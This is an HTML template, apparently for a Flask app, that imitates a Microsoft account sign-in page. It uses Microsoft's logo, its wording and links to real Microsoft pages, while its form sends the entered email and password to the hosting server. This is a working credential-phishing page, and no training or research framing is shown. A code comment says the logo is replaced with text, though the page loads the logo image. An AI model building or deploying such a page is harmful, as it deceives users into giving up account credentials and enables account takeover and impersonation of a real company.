<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Sign in to your account</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>

<body>
    <div class="container">
        <!-- Microsoft logo (official logo is trademarked, so we use text) -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft"
            class="logo" />
        <h1>Sign in</h1>
        <div class="subtitle">Use your Microsoft account</div>
        <form method="POST">
            <input type="text" name="username" placeholder="Email, phone, or Skype" required autocomplete="username" />
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password" />
            <button type="submit">Sign in</button>
        </form>
        <div class="footer">
            <a href="https://account.microsoft.com">Sign-in options</a> | <a
                href="https://account.microsoft.com/password/reset">Forgot my password</a>
        </div>
    </div>
</body>

</html>
